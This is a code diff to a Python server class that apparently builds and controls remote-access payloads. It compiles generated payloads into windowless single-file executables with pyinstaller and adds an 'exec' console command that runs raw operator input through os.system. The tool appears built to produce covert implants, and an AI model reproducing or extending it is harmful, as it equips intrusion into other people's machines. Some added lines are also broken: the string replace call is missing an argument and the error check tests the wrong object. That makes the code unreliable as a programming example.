@@ -91,6 +91,10 @@ class Server:
 
     def generate_payload(self, filename):
         
+        error = "ImportError: No module named _bootlocale"
+        fix = "--exclude-module _bootlocale"
+
+        
         filename = self.check_filename(filename)
 
         tmp_host = "67b3dba8bc6778101892eb77249db32e"
@@ -123,10 +127,22 @@ class Server:
 
         try:
             console.print("[bold green]Compiling...[/bold green]")
-            compile_process = sp.run(f'pyinstaller --onefile --noconsole "{filename}"',
-                    shell=True,
-                    stdout=sp.PIPE,
-                    stderr=sp.PIPE)
+
+            if sys.platform == "linux":
+                compile_process = sp.run(f'pyinstaller --onefile --noconsole "{filename}" {fix}',
+                        shell=True,
+                        stdout=sp.PIPE,
+                        stderr=sp.PIPE)
+
+            else:
+                compile_process = sp.run(f'pyinstaller --onefile --noconsole "{filename}"',
+                        shell=True,
+                        stdout=sp.PIPE,
+                        stderr=sp.PIPE)
+            
+            if error in compile_process:
+                console.print("Fixing compatibility problem...", style="bold purple")
+
             
             console.print(compile_process.stdout, style="green")
             console.print(compile_process.stderr, style="red")
@@ -200,6 +216,10 @@ GPORT : <[bold purple]{self.gport}[bold blue]>
 
                 if cmd.lower() == "help":
                     console.print(console_help)
+
+                elif cmd.lower().startswith("exec"):
+                    cmd_ = cmd.replace("exec ")
+                    os.system(cmd_)
 
                 elif cmd.startswith("generate"):
                     try:
